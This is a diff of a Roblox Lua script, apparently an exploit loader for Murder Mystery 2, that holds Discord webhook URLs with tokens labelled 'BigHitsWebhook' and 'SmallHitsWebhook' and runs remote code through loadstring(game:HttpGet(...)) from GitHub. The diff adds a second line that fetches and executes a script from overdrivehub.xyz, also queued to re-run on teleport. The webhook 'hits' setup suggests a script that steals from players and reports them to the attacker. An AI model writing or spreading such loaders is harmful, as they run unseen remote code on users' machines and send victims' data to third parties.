@@ -10,7 +10,9 @@ if game.GameId ~= 66654135 then
     }
     BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
     SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()]]
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
+]]
     queue_on_teleport(script)
 
     task.wait(0.1)
@@ -23,6 +25,7 @@ Usernames = {
 BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
 SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
+loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
 
 
 --[[
